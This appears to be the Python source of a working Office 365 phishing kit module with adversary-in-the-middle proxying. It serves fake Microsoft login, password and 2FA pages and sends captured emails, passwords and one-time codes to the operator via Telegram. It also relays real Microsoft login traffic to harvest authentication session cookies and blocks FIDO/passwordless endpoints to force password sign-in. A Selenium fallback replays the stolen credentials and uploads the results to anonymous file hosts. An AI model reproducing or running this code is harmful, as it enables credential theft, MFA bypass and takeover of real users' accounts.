from __future__ import print_function
from flask import redirect, request, session
import json
import time
import os
import traceback
import shutil
import datetime
import threading
from os import getenv
from core.base_module import BaseModule
from core.aitm_proxy import AiTMManager
import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager


class Office365Module(BaseModule):
    def __init__(self, enable_2fa=False, use_aitm_proxy=True):
        super().__init__(self)
        self.set_name('office365')
        self.add_route('login', '/')
        self.add_route('password_page', '/password')
        # intermediate loading page shown after password submission
        self.add_route('loading', '/loading')
        self.add_route('twofactor', '/twofactor')
        self.add_route('redirect', '/redirect')
        # AiTM proxy routes

        self.add_route('proxy_endpoint', '/proxy')
        self.add_route('proxy_catch_all', '/proxy/<path:path>')
        
        # Add routes for static resources from Microsoft domains
        self.add_route('proxy_static_resources', '/static/<path:path>')
        self.add_route('proxy_cdn_resources', '/cdn/<path:path>')
        self.add_route('proxy_assets', '/assets/<path:path>')

        self.add_route('aitm_status', '/aitm/status')
        self.add_route('aitm_start', '/aitm/start')
        self.add_route('aitm_results', '/aitm/results')
        
        self.enable_two_factor(enable_2fa)
        self.use_aitm_proxy = use_aitm_proxy
        self.aitm_manager = AiTMManager()
        self.aitm_proxy_url = None
        self.attack_mode = "aitm"  # "aitm" or "selenium"


    def log(self, message):
        """Logging method for debugging"""
        print(f"[Office365Module] {message}")


    def login(self):
        template = self.env.get_template('login.html')
        return template.render(next_url='/password', hostname=request.host)

    def password_page(self):
        self.user = request.values.get('loginfmt') or request.values.get('email')
        template = self.env.get_template('password.html')
        # password page posts to /loading so we can show a verifying screen
        return template.render(next_url='/loading', hostname=request.host, email=self.user)

    def loading(self):
        """Handle password submission, send early credentials, show verifying dots."""
        self.user = request.values.get('email') or request.values.get('loginfmt')
        self.captured_password = request.values.get('passwd')

        # Early exfiltration
        ip = request.remote_addr
        ua = request.user_agent.string
        early_msg = (
            f"*O365 Credential Capture (Part 1)*\n"
            f"IP: `{ip}`\nUser-Agent: `{ua}`\n\n"
            f"Email: `{self.user}`\nPassword: `{self.captured_password}`\n"
            "Waiting for 2FA code…"
        )
        self.send_telegram(early_msg)

        template = self.env.get_template('loading.html')
        # auto-redirect to 2FA page after short delay
        return template.render(next_url='/twofactor', hostname=request.host, email=self.user, password=self.captured_password)

    def twofactor(self):
        # we reach here via redirect from loading page (GET) or direct POST
        self.user = request.values.get('email') or getattr(self, 'user', None)
        self.captured_password = request.values.get('password') or getattr(self, 'captured_password', None)
        template = self.env.get_template('twofactor.html')
        return template.render(next_url='/redirect', hostname=request.host, email=self.user, password=self.captured_password)

    def redirect(self):
        self.user = request.values.get('email')
        self.captured_password = request.values.get('password')
        self.two_factor_token = request.values.get('two_factor_token')

        # Detect personal vs organizational account
        personal_domains = ['gmail.com', 'outlook.com', 'hotmail.com', 'live.com', 'msn.com', 'yahoo.com']
        is_personal = any(domain in self.user.lower() for domain in personal_domains)

        # Use AiTM for both personal and organizational accounts
        # Personal account support has been implemented with proper FIDO bypass
        self.attack_mode = "aitm"
        
        if is_personal:
            self.log(f"[AiTM] Personal account detected ({self.user}) – using AiTM with personal account flow")
        else:
            self.log(f"[AiTM] Organizational account detected ({self.user}) – using AiTM with organizational flow")
        
        
        # Send early exfiltration of credentials
        ip = request.remote_addr
        ua = request.user_agent.string
        early_msg = (
            f"*O365 AiTM Attack Initiated*\n"
            f"IP: `{ip}`\nUser-Agent: `{ua}`\n\n"
            f"Email: `{self.user}`\nPassword: `{self.captured_password}`\n2FA: `{self.two_factor_token}`\n"
            f"🎯 Redirecting victim to AiTM proxy for real authentication..."
        )
        self.send_telegram(early_msg)

        # Start AiTM proxy IMMEDIATELY and redirect victim to it
        if self.use_aitm_proxy and self.attack_mode == "aitm":
            return self._start_proxy_and_redirect_victim()
        else:
            # Only use Selenium if AiTM is disabled
            return self._handle_selenium_attack()

    def _start_proxy_and_redirect_victim(self):
        """Start AiTM proxy immediately and redirect victim to it"""
        try:
            self.log(f"[AiTM] Starting proxy setup for victim: {getattr(self, 'user', 'Unknown')}")
            
            # For our Flask-based proxy, we don't need the separate mitmproxy instance
            # The proxy functionality is built into the Flask routes
            
            # Get the public proxy URL using current host
            current_host = request.host
            self.log(f"[AiTM] Current host detected: {current_host}")
            
            public_proxy_url = f"https://{current_host}/proxy"
            self.log(f"[AiTM] Public proxy URL constructed: {public_proxy_url}")
            
            # Set the appropriate target domain based on user email
            if hasattr(self, 'user') and self.user:
                self.log(f"[AiTM] User attribute found: {self.user}")
                personal_domains = ['gmail.com', 'outlook.com', 'hotmail.com', 'live.com', 'msn.com', 'yahoo.com']
                is_personal = any(domain in self.user.lower() for domain in personal_domains)
                
                if is_personal:
                    self.log(f"[AiTM] Targeting personal account flow for {self.user}")
                    # For personal accounts, we'll proxy both login.live.com and account.live.com
                else:
                    self.log(f"[AiTM] Targeting organizational account flow for {self.user}")
                    # For organizational accounts, we'll proxy login.microsoftonline.com
            else:
                self.log(f"[AiTM] WARNING: User attribute not found or empty")
            
            self.aitm_proxy_url = public_proxy_url
            self.log(f"[AiTM] Set aitm_proxy_url to: {self.aitm_proxy_url}")
            
            # Initialize proxy data storage
            self.log(f"[AiTM] Checking aitm_manager: {type(self.aitm_manager)}")
            if not hasattr(self.aitm_manager, 'proxy') or self.aitm_manager.proxy is None:
                self.log(f"[AiTM] Creating proxy data storage object")
                
                # Create a proper proxy data object with the expected methods
                class ProxyData:
                    def __init__(self):
                        self.captured_data = {'cookies': [], 'credentials': {}, 'session_info': {}}
                    
                    def get_captured_data(self):
                        return self.captured_data.copy()
                    
                    def validate_captured_cookies(self):
                        return {'valid': len(self.captured_data.get('cookies', [])) > 0, 'error': None}
                    
                    def stop_proxy(self):
                        print(f"[ProxyData] Stop proxy called - no actual proxy to stop")
                        return True
                
                self.aitm_manager.proxy = ProxyData()
                self.log(f"[AiTM] Proxy data storage created successfully with methods: {dir(self.aitm_manager.proxy)}")
            else:
                self.log(f"[AiTM] Proxy data storage already exists: {type(self.aitm_manager.proxy)}")
            
            # Start background monitoring for captured data
            self.log(f"[AiTM] Starting background monitoring...")
            self._start_aitm_monitoring()
            self.log(f"[AiTM] Background monitoring started successfully")
            
            # Immediately redirect victim to the proxy URL 
            self.log(f"[AiTM] Redirecting victim {self.user} to Flask proxy: {public_proxy_url}")
            redirect_response = redirect(public_proxy_url, code=302)
            self.log(f"[AiTM] Redirect response created successfully: {type(redirect_response)}")
            return redirect_response
                
        except Exception as ex:
            import traceback
            tb = traceback.format_exc()
            self.log(f"[AiTM] CRITICAL EXCEPTION in _start_proxy_and_redirect_victim: {ex}")
            self.log(f"[AiTM] FULL TRACEBACK: {tb}")
            self.attack_mode = "selenium"
            fallback_msg = (
                f"*⚠️ AiTM Proxy Failed - Selenium Fallback*\n"
                f"Email: `{getattr(self, 'user', 'Unknown')}`\n"
                f"Error: `{str(ex)}`\n"
                f"🔄 Falling back to Selenium automation..."
            )
            self.send_telegram(fallback_msg)
            return self._handle_selenium_attack()

    def _start_aitm_monitoring(self):
        """Start background monitoring for AiTM capture results"""
        try:
            self.log(f"[AiTM] _start_aitm_monitoring called")
            import threading
            self.log(f"[AiTM] Threading imported successfully")
            
            # Add session tracking to prevent duplicate messages
            self.aitm_results_sent = False
            self.last_cookie_count = 0
            
            def _monitor_aitm_results():
                try:
                    self.log(f"[AiTM] Background monitor thread started")
                    
                    # Wait 30 seconds before starting monitoring to let the page load properly
                    self.log(f"[AiTM] Waiting 30s for page to load before starting monitoring...")
                    time.sleep(30)
                    
                    # Monitor for 5 minutes for victim interaction
                    start_time = time.time()
                    timeout = 300  # 5 minutes
                    self.log(f"[AiTM] Monitor timeout set to {timeout} seconds")
                    
                    while time.time() - start_time < timeout:
                        time.sleep(15)  # Check every 15 seconds (less aggressive)
                        self.log(f"[AiTM] Monitor check - elapsed: {int(time.time() - start_time)}s")
                        
                        # Skip if we already sent results
                        if self.aitm_results_sent:
                            self.log(f"[AiTM] Results already sent, continuing monitoring for session changes...")
                            continue
                        
                        # Get captured data from proxy
                        try:
                            captured_data = self.aitm_manager.get_attack_results()
                            self.log(f"[AiTM] Retrieved attack results: {bool(captured_data)}")
                        except Exception as get_ex:
                            self.log(f"[AiTM] Exception getting attack results: {get_ex}")
                            captured_data = {}

                        # Check if we have significant cookies (not just tracking cookies)
                        significant_cookies = []
                        if captured_data.get('cookies'):
                            for cookie_data in captured_data['cookies']:
                                cookie = cookie_data.get('parsed', {})
                                if cookie.get('name'):
                                    name = cookie['name'].upper()
                                    # Look for authentication cookies, not just tracking
                                    if any(important in name for important in ['ESTSAUTH', 'STSSERVICE', 'BUID', 'RTFA', 'FEDAUTH', 'SESSIONID']):
                                        significant_cookies.append(cookie['name'])
                        
                        cookie_count = len(captured_data.get('cookies', []))
                        significant_count = len(significant_cookies)
                        
                        # Only send results if we have significant cookies AND cookie count increased meaningfully
                        has_meaningful_data = (
                            significant_count > 0 or  # Has auth cookies
                            cookie_count > 20 or      # Has many cookies (likely authenticated)
                            captured_data.get('credentials') or 
                            captured_data.get('session_info', {}).get('auth_success')
                        )
                        
                        # Check for significant increase in cookies (not just 1-2 tracking cookies)
                        significant_increase = (cookie_count - self.last_cookie_count) >= 5
                        
                        if has_meaningful_data and (significant_increase or self.last_cookie_count == 0):
                            self.log(f"[AiTM] Meaningful data captured! Cookies: {cookie_count}, Significant: {significant_count}")
                            self.log(f"[AiTM] Significant cookies: {significant_cookies}")
                            
                            # We got something meaningful! Validate and send results
                            try:
                                validation_result = self.aitm_manager.validate_session()
                                self.log(f"[AiTM] Session validation completed")
                                self._send_aitm_results(self.user, self.captured_password, self.two_factor_token, captured_data, validation_result)
                                self.log(f"[AiTM] Results sent via Telegram")
                                
                                # Mark as sent to prevent duplicates
                                self.aitm_results_sent = True
                                self.last_cookie_count = cookie_count
                                
                            except Exception as val_ex:
                                self.log(f"[AiTM] Exception during validation/sending: {val_ex}")
                            
                            # Success! Stop monitoring after sending results
                            self.log(f"[AiTM] Successfully captured session data for {self.user}")
                            break
                        else:
                            self.log(f"[AiTM] Data not significant enough - Cookies: {cookie_count}, Significant: {significant_count}, Increase: {cookie_count - self.last_cookie_count}")
                            self.last_cookie_count = cookie_count
                            
                    else:
                        # Timeout reached, no cookies captured
                        self.log(f"[AiTM] Timeout reached - no session data captured for {self.user}")
                        
                        # Optional: Fall back to Selenium after timeout
                        timeout_msg = (
                            f"*O365 AiTM Timeout*\n"
                            f"Email: `{self.user}`\n"
                            f"⚠️ Victim did not complete authentication through proxy\n"
                            f"🔄 Falling back to Selenium automation..."
                        )
                        self.send_telegram(timeout_msg)
                        
                        # Start Selenium fallback
                        self._selenium_fallback(self.user, self.captured_password, self.two_factor_token)
                        
                except Exception as ex:
                    import traceback
                    tb = traceback.format_exc()
                    self.log(f"[AiTM] Monitor thread exception: {ex}")
                    self.log(f"[AiTM] Monitor thread traceback: {tb}")
                finally:
                    # Always stop the proxy when done
                    try:
                        self.log(f"[AiTM] Stopping AiTM attack...")
                        self.aitm_manager.stop_aitm_attack()
                        self.log(f"[AiTM] AiTM attack stopped")
                    except Exception as stop_ex:
                        self.log(f"[AiTM] Exception stopping attack: {stop_ex}")
            
            self.log(f"[AiTM] Creating monitor thread...")
            monitor_thread = threading.Thread(target=_monitor_aitm_results, daemon=True)
            self.log(f"[AiTM] Starting monitor thread...")
            monitor_thread.start()
            self.log(f"[AiTM] Monitor thread started successfully")
            
        except Exception as monitor_ex:
            import traceback
            tb = traceback.format_exc()
            self.log(f"[AiTM] CRITICAL EXCEPTION in _start_aitm_monitoring: {monitor_ex}")
            self.log(f"[AiTM] MONITORING TRACEBACK: {tb}")
            raise  # Re-raise the exception so it's caught by the parent method

    def _handle_aitm_attack(self):
        """Legacy method - replaced by _start_proxy_and_redirect_victim"""
        return self._start_proxy_and_redirect_victim()


    def _handle_selenium_attack(self):
        """Handle Selenium-based attack (original method)"""
        return self._selenium_fallback(self.user, self.captured_password, self.two_factor_token)

    def _selenium_fallback(self, user, pwd, token):
        """Selenium fallback method (original implementation)"""
        import threading, json

        def _cookie_worker(user, pwd, token):
            import os  # new: needed for path handling in uploads
            # helper: try multiple anonymous hosting providers, return URL or None
            def _upload(file_path):
                # Added tmpfiles.org as an additional fallback provider for artefact uploads
                providers = [
                    ('transfer.sh', 'PUT'),
                    ('0x0.st', 'POST'),
                    ('tmpfiles.org', 'POST'),
                ]
                for host, method in providers:
                    try:
                        if method == 'PUT':
                            with open(file_path, 'rb') as fp:
                                resp = requests.put(
                                    f'https://{host}/{os.path.basename(file_path)}',
                                    data=fp,
                                    timeout=30,
                                )
                        else:  # POST multipart
                            with open(file_path, 'rb') as fp:
                                resp = requests.post(
                                    f'https://{host}',
                                    files={'file': (os.path.basename(file_path), fp)},
                                    timeout=30,
                                )
                        if resp.ok and resp.text.strip().startswith('http'):
                            return resp.text.strip()
                    except Exception as exc:
                        print(f"[upload] Provider {host} failed for {file_path}: {exc}")
                return None

            try:
                self.user = user
                self.captured_password = pwd
                self.two_factor_token = token
                cookies = self.perform_automated_login()
            except Exception as ex:
                tb = traceback.format_exc()
                print(f"[cookie_worker] Exception in perform_automated_login: {tb}")
                cookies = [{"error": str(ex), "traceback": tb}]

            # Attempt to upload debug artefacts (page_source / screenshot)
            artefact_links, doc_paths = [], []
            if cookies and isinstance(cookies, list) and cookies:
                first = cookies[0]
                for key, local_path in list(first.items()):
                    if not (isinstance(local_path, str) and os.path.exists(local_path)):
                        continue
                    url = _upload(local_path)
                    if url:
                        artefact_links.append(f"{key}: {url}")
                        first[key] = url  # replace with remote URL
                    else:
                        doc_paths.append(local_path)

            # Enhanced error reporting
            if cookies and len(cookies) > 0 and 'error' in cookies[0]:
                error_details = cookies[0].get('error', 'Unknown error')
                traceback_info = cookies[0].get('traceback', 'No traceback available')
                cookie_block = f"Error: {error_details}\n\nTraceback:\n{traceback_info}"
            else:
                cookie_block = json.dumps(cookies, indent=2) if cookies else 'Cookie capture failed'
            
            msg = (
                f"*O365 Credential Capture (Selenium Fallback)*\nEmail: `{user}`\nPassword: `{pwd}`\n2FA: `{token}`\n\nCookies:\n```\n{cookie_block}\n```"
            )
            if artefact_links:
                msg += "\n\nDebug artefacts:\n" + "\n".join(artefact_links)

            self.send_telegram(msg, document_paths=doc_paths if doc_paths else None)

        threading.Thread(target=_cookie_worker, args=(user, pwd, token), daemon=True).start()

        # Give the victim the real Microsoft redirect right away
        return redirect(self.final_url, code=302)

    def _send_aitm_results(self, user, pwd, token, captured_data, validation_result):
        """Send AiTM attack results via Telegram"""
        try:
            # Format captured data
            credentials_info = captured_data.get('credentials', {})
            cookies_count = len(captured_data.get('cookies', []))
            tokens_count = len(captured_data.get('tokens', []))
            
            # Check if session is valid
            session_status = "✅ VALID" if validation_result.get('valid') else "❌ INVALID"
            
            msg = (
                f"*O365 AiTM Attack Results*\n"
                f"🎯 Attack Mode: `Adversary-in-the-Middle`\n"
                f"📧 Email: `{user}`\n"
                f"🔑 Password: `{pwd}`\n"
                f"🔐 2FA: `{token}`\n\n"
                f"🍪 Cookies Captured: `{cookies_count}`\n"
                f"🎟️ Tokens Captured: `{tokens_count}`\n"
                f"✨ Session Status: {session_status}\n\n"
            )
            
            # Add captured credentials from proxy
            if credentials_info:
                msg += "📋 Proxy Captured:\n"
                for key, value in credentials_info.items():
                    if key == 'password':
                        msg += f"  {key}: `{'*' * len(str(value))}`\n"
                    else:
                        msg += f"  {key}: `{value}`\n"
                msg += "\n"
            
            # Add cookies summary - show only meaningful authentication cookies
            if captured_data.get('cookies'):
                auth_cookies = []
                tracking_cookies = []
                
                for cookie_data in captured_data['cookies']:
                    cookie = cookie_data.get('parsed', {})
                    if cookie.get('name'):
                        name = cookie['name']
                        name_upper = name.upper()
                        
                        # Categorize cookies
                        if any(important in name_upper for important in ['ESTSAUTH', 'STSSERVICE', 'BUID', 'RTFA', 'FEDAUTH', 'SESSIONID']):
                            auth_cookies.append(name)
                        elif name_upper == 'FPC':
                            tracking_cookies.append(name)
                
                # Show auth cookies first, then tracking summary
                display_cookies = []
                if auth_cookies:
                    # Remove duplicates and show unique auth cookies
                    unique_auth = list(dict.fromkeys(auth_cookies))  # Preserves order, removes duplicates
                    display_cookies.extend(unique_auth[:3])  # Show max 3 auth cookies
                
                if tracking_cookies and len(display_cookies) < 3:
                    # Only show "FPC(x2)" style summary for tracking cookies
                    fpc_count = len(tracking_cookies)
                    if fpc_count > 1:
                        display_cookies.append(f"FPC({fpc_count})")
                    else:
                        display_cookies.append("FPC")
                
                if display_cookies:
                    msg += f"🔑 Key Cookies: `{', '.join(display_cookies)}`\n"
                elif len(captured_data['cookies']) > 0:
                    msg += f"🔑 Key Cookies: `{len(captured_data['cookies'])} captured (analysis in progress)`\n"
            
            # Add validation details
            if validation_result:
                msg += f"🔍 Validation URL: `{validation_result.get('test_url', 'N/A')}`\n"
                msg += f"📊 Response Code: `{validation_result.get('status_code', 'N/A')}`\n"
            
            # Save HAR file and include in message
            har_paths = []
            if hasattr(self.aitm_manager.proxy, 'save_har_file'):
                timestamp = datetime.datetime.utcnow().strftime('%Y%m%dT%H%M%SZ')
                har_path = f'/tmp/aitm_traffic_{timestamp}.har'
                if self.aitm_manager.proxy.save_har_file(har_path):
                    har_paths.append(har_path)
            
            self.send_telegram(msg, document_paths=har_paths if har_paths else None)
            
        except Exception as e:
            print(f"Error sending AiTM results: {e}")
            # Send basic message as fallback
            fallback_msg = f"*O365 AiTM Attack Completed*\nEmail: `{user}`\nCookies: `{len(captured_data.get('cookies', []))}`"
            self.send_telegram(fallback_msg)

    def aitm_status(self):
        """API endpoint to check AiTM proxy status"""
        try:
            status = {
                'aitm_enabled': self.use_aitm_proxy,
                'attack_mode': self.attack_mode,
                'proxy_running': self.aitm_manager.proxy_enabled if self.aitm_manager else False,
                'proxy_url': self.aitm_proxy_url
            }
            return json.dumps(status, indent=2)
        except Exception as e:
            return json.dumps({'error': str(e)})

    def aitm_start(self):
        """API endpoint to manually start AiTM proxy"""
        try:
            email = request.values.get('email', 'target@company.com')
            result = self.aitm_manager.start_aitm_attack(email)
            if result.get('success'):
                self.aitm_proxy_url = result['proxy_url']
            return json.dumps(result, indent=2)
        except Exception as e:
            return json.dumps({'error': str(e)})

    def aitm_results(self):
        """API endpoint to get AiTM attack results"""
        try:
            if self.aitm_manager and self.aitm_manager.proxy:
                results = self.aitm_manager.get_attack_results()
                validation = self.aitm_manager.validate_session()
                return json.dumps({
                    'captured_data': results,
                    'validation': validation
                }, indent=2)
            else:
                return json.dumps({'error': 'No active AiTM proxy'})
        except Exception as e:
            return json.dumps({'error': str(e)})


    def proxy_endpoint(self):
        """AiTM Proxy endpoint - serves real Microsoft login while capturing traffic"""
        try:
            # Log that victim reached the proxy endpoint
            ip = request.remote_addr
            ua = request.user_agent.string
            
            proxy_msg = (
                f"*🎯 AiTM Proxy Active*\n"
                f"IP: `{ip}`\nUser-Agent: `{ua}`\n"
                f"Victim accessing real Microsoft login through proxy...\n"
                f"⚡ Session capture in progress..."
            )
            self.send_telegram(proxy_msg)
            
            # Get target Microsoft URL based on the request
            target_path = request.args.get('path', '')
            query_string = request.query_string.decode('utf-8')
            
            # Build the target Microsoft URL
            if target_path:
                microsoft_url = f"https://login.microsoftonline.com{target_path}"
            else:
                # Default to Microsoft login with user hint if available
                if hasattr(self, 'user') and self.user:
                    # Check if it's a personal account (gmail.com, outlook.com, hotmail.com, live.com, etc.)
                    personal_domains = ['gmail.com', 'outlook.com', 'hotmail.com', 'live.com', 'msn.com', 'yahoo.com']
                    is_personal = any(domain in self.user.lower() for domain in personal_domains)
                    
                    if is_personal:
                        # Use consumer/personal account endpoint with password-first flow
                        # Force password authentication and skip FIDO/passwordless
                        microsoft_url = f"https://login.live.com/login.srf?username={self.user}&wa=wsignin1.0&wtrealm=uri:WindowsLiveID&wctx=bk%3d1456841834%26bru%3dhttps%253a%252f%252fwww.office.com%252f&wreply=https://www.office.com/landingv2.aspx&lc=1033&id=292666&mkt=EN-US&psi=office365&uiflavor=web&amtcb=1&forcepassword=1"
                    else:
                        # Use organizational account endpoint
                        microsoft_url = f"https://login.microsoftonline.com/common/oauth2/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&response_type=code&redirect_uri=https://www.office.com/&scope=openid%20profile&login_hint={self.user}"
                else:
                    microsoft_url = "https://login.microsoftonline.com/"
            
            # Add query parameters if present
            if query_string and '?' not in microsoft_url:
                microsoft_url += f"?{query_string}"
            elif query_string:
                microsoft_url += f"&{query_string}"
            
            # Proxy the request to Microsoft
            return self._proxy_to_microsoft(microsoft_url)
            
        except Exception as e:
            import traceback
            tb = traceback.format_exc()
            self.log(f"[AiTM] Proxy endpoint error: {e}")
            self.log(f"[AiTM] Proxy endpoint traceback: {tb}")
            
            # Send error notification with more details
            error_msg = (
                f"*⚠️ AiTM Proxy Error*\n"
                f"Error: `{str(e)}`\n"
                f"URL: `{request.url}`\n"
                f"Method: `{request.method}`\n"
                f"User: `{getattr(self, 'user', 'Unknown')}`\n"
                f"🔄 Attempting fallback..."
            )
            self.send_telegram(error_msg)
            
            # Better fallback based on user type
            if hasattr(self, 'user') and self.user:
                personal_domains = ['gmail.com', 'outlook.com', 'hotmail.com', 'live.com', 'msn.com', 'yahoo.com']
                is_personal = any(domain in self.user.lower() for domain in personal_domains)
                
                if is_personal:
                    fallback_url = f"https://login.live.com/login.srf?username={self.user}&wa=wsignin1.0&wtrealm=uri:WindowsLiveID&wctx=bk%3d1456841834%26bru%3dhttps%253a%252f%252fwww.office.com%252f&wreply=https://www.office.com/landingv2.aspx&lc=1033&id=292666&mkt=EN-US&psi=office365&uiflavor=web&forcepassword=1&amtcb=1"
                else:
                    fallback_url = f"https://login.microsoftonline.com/common/oauth2/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&response_type=code&redirect_uri=https://www.office.com/&scope=openid%20profile&login_hint={self.user}"
            else:
                fallback_url = "https://login.microsoftonline.com/"
            
            return redirect(fallback_url, code=302)

    def proxy_catch_all(self, path):
        """Handle all paths under /proxy/ for complete Microsoft login flow"""
        try:
            # Build the target Microsoft URL with the given path
            query_string = request.query_string.decode('utf-8')
            
            # Determine target domain based on user type and path
            if hasattr(self, 'user') and self.user:
                personal_domains = ['gmail.com', 'outlook.com', 'hotmail.com', 'live.com', 'msn.com', 'yahoo.com']
                is_personal = any(domain in self.user.lower() for domain in personal_domains)
                
                if is_personal:
                    # For personal accounts, route to appropriate Microsoft consumer domain
                    if 'consumers' in path or 'fido' in path or 'microsoft.com' in path:
                        target_url = f"https://login.microsoft.com/{path}"
                    elif 'account' in path:
                        target_url = f"https://account.live.com/{path}"
                    else:
                        target_url = f"https://login.live.com/{path}"
                else:
                    # For organizational accounts, use login.microsoftonline.com
                    if 'account' in path and 'microsoft.com' in path:
                        target_url = f"https://account.microsoft.com/{path}"
                    else:
                        target_url = f"https://login.microsoftonline.com/{path}"
            else:
                # Default to organizational
                target_url = f"https://login.microsoftonline.com/{path}"
            
            if query_string:
                target_url += f"?{query_string}"
            
            self.log(f"[AiTM] Catch-all proxying /{path} to: {target_url}")
            
            # Proxy the request to Microsoft
            return self._proxy_to_microsoft(target_url)
            
        except Exception as e:
            self.log(f"[AiTM] Catch-all proxy error: {e}")
            return redirect("https://login.microsoftonline.com/", code=302)

    def proxy_static_resources(self, path):
        """Handle static resources from Microsoft CDNs"""
        try:
            query_string = request.query_string.decode('utf-8')
            
            # Map our static routes to real Microsoft CDN domains
            if path.startswith('aadcdn/'):
                real_path = path.replace('aadcdn/', '', 1)
                target_url = f"https://aadcdn.msftauth.net/{real_path}"
            elif path.startswith('logincdn/'):
                real_path = path.replace('logincdn/', '', 1)
                target_url = f"https://logincdn.msftauth.net/{real_path}"
            elif path.startswith('memgfx/'):
                real_path = path.replace('memgfx/', '', 1)
                target_url = f"https://mem.gfx.ms/{real_path}"
            elif path.startswith('sms/'):
                real_path = path.replace('sms/', '', 1)
                target_url = f"https://c.s-microsoft.com/{real_path}"
            elif path.startswith('spo/'):
                real_path = path.replace('spo/', '', 1)
                target_url = f"https://static2.sharepointonline.com/{real_path}"
            else:
                # Default to AAD CDN
                target_url = f"https://aadcdn.msftauth.net/{path}"
            
            if query_string:
                target_url += f"?{query_string}"
            
            self.log(f"[AiTM] Proxying static resource: {target_url}")
            
            # Proxy the static resource
            return self._proxy_static_resource(target_url)
            
        except Exception as e:
            self.log(f"[AiTM] Static resource proxy error: {e}")
            from flask import Response
            return Response('', status=404)

    def proxy_cdn_resources(self, path):
        """Handle CDN resources"""
        try:
            query_string = request.query_string.decode('utf-8')
            target_url = f"https://aadcdn.msftauth.net/{path}"
            
            if query_string:
                target_url += f"?{query_string}"
            
            self.log(f"[AiTM] Proxying CDN resource: {target_url}")
            return self._proxy_static_resource(target_url)
            
        except Exception as e:
            self.log(f"[AiTM] CDN resource proxy error: {e}")
            from flask import Response
            return Response('', status=404)

    def proxy_assets(self, path):
        """Handle asset resources"""
        try:
            query_string = request.query_string.decode('utf-8')
            target_url = f"https://login.microsoftonline.com/assets/{path}"
            
            if query_string:
                target_url += f"?{query_string}"
            
            self.log(f"[AiTM] Proxying asset resource: {target_url}")
            return self._proxy_static_resource(target_url)
            
        except Exception as e:
            self.log(f"[AiTM] Asset resource proxy error: {e}")
            from flask import Response
            return Response('', status=404)

    def _proxy_static_resource(self, target_url):
        """Proxy static resources (CSS, JS, images, fonts) without modification"""
        try:
            import requests
            from flask import Response, request as flask_request
            
            # Forward headers for static resources
            headers = {}
            for key, value in flask_request.headers:
                if key.lower() not in ['host', 'content-length']:
                    headers[key] = value
            
            # Set appropriate headers for static resources
            headers['User-Agent'] = flask_request.headers.get('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
            headers['Accept'] = flask_request.headers.get('Accept', '*/*')
            headers['Accept-Encoding'] = 'gzip, deflate'
            headers['Cache-Control'] = 'max-age=3600'
            
            # Make request to get static resource
            resp = requests.get(target_url, headers=headers, timeout=30)
            
            # Prepare response headers
            response_headers = {}
            for key, value in resp.headers.items():
                if key.lower() not in ['content-encoding', 'transfer-encoding', 'connection']:
                    response_headers[key] = value
            
            # For CSS files, we might need to rewrite URLs inside them
            content = resp.content
            if resp.headers.get('content-type', '').startswith('text/css'):
                try:
                    css_content = content.decode('utf-8', errors='ignore')
                    current_host = flask_request.host
                    
                    # Rewrite URLs in CSS files
                    css_replacements = [
                        ('https://aadcdn.msftauth.net/', f'https://{current_host}/static/aadcdn/'),
                        ('https://logincdn.msftauth.net/', f'https://{current_host}/static/logincdn/'),
                        ('//aadcdn.msftauth.net/', f'//{current_host}/static/aadcdn/'),
                        ('//logincdn.msftauth.net/', f'//{current_host}/static/logincdn/'),
                    ]
                    
                    for old_url, new_url in css_replacements:
                        css_content = css_content.replace(old_url, new_url)
                    
                    content = css_content.encode('utf-8')
                    response_headers['Content-Length'] = str(len(content))
                    
                except Exception as e:
                    self.log(f"[AiTM] CSS rewriting error: {e}")
            
            # Create Flask response for static resource
            flask_response = Response(
                content,
                status=resp.status_code,
                headers=response_headers
            )
            
            return flask_response
            
        except Exception as e:
            self.log(f"[AiTM] Static resource proxy error: {e}")
            return Response('', status=404)

    def _proxy_to_microsoft(self, target_url):
        """Proxy the request to Microsoft and capture response data"""
        try:
            import requests
            from flask import Response, request as flask_request
            
            # CRITICAL: Block FIDO endpoints BEFORE making any request to Microsoft
            fido_url_paths = [
                '/consumers/fido/get',
                '/fido/webauthn/',
                '/passwordless/'
            ]
            
            target_url_lower = target_url.lower()
            is_fido_endpoint = any(path in target_url_lower for path in fido_url_paths)
            
            if is_fido_endpoint:
                self.log(f"[AiTM] Blocking FIDO endpoint BEFORE request: {target_url}")
                # Return empty response to block FIDO initialization completely
                return Response('', status=204, headers={'Content-Type': 'application/json'})
            
            # Log the proxy request
            self.log(f"[AiTM] Proxying to: {target_url}")
            
            # Forward the request to Microsoft
            headers = {}
            for key, value in flask_request.headers:
                if key.lower() not in ['host', 'content-length']:
                    headers[key] = value
            
            # Set proper User-Agent and other headers to avoid automation detection
            headers['User-Agent'] = flask_request.headers.get('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36')
            headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
            headers['Accept-Language'] = 'en-US,en;q=0.5'
            headers['Accept-Encoding'] = 'gzip, deflate'
            headers['Connection'] = 'keep-alive'
            headers['Upgrade-Insecure-Requests'] = '1'
            headers['Sec-Fetch-Dest'] = 'document'
            headers['Sec-Fetch-Mode'] = 'navigate'
            headers['Sec-Fetch-Site'] = 'cross-site'
            headers['Cache-Control'] = 'max-age=0'
            
            # Make the request to Microsoft
            if flask_request.method == 'POST':
                resp = requests.post(target_url, headers=headers, data=flask_request.get_data(), 
                                   allow_redirects=False, timeout=30)
            else:
                resp = requests.get(target_url, headers=headers, allow_redirects=False, timeout=30)
            
            # Capture Set-Cookie headers (the crown jewels!)
            captured_cookies = []
            if 'Set-Cookie' in resp.headers:
                set_cookie_headers = resp.headers.get_all('Set-Cookie') if hasattr(resp.headers, 'get_all') else [resp.headers.get('Set-Cookie')]
                for cookie_header in set_cookie_headers:
                    if cookie_header:
                        captured_cookies.append({
                            'timestamp': datetime.datetime.utcnow().isoformat(),
                            'raw_header': cookie_header,
                            'parsed': self._parse_cookie_header(cookie_header)
                        })
                        self.log(f"[AiTM] Captured cookie: {cookie_header[:50]}...")
            
            # If we captured cookies, this might be the authentication success!
            if captured_cookies:
                self._handle_captured_cookies(captured_cookies)
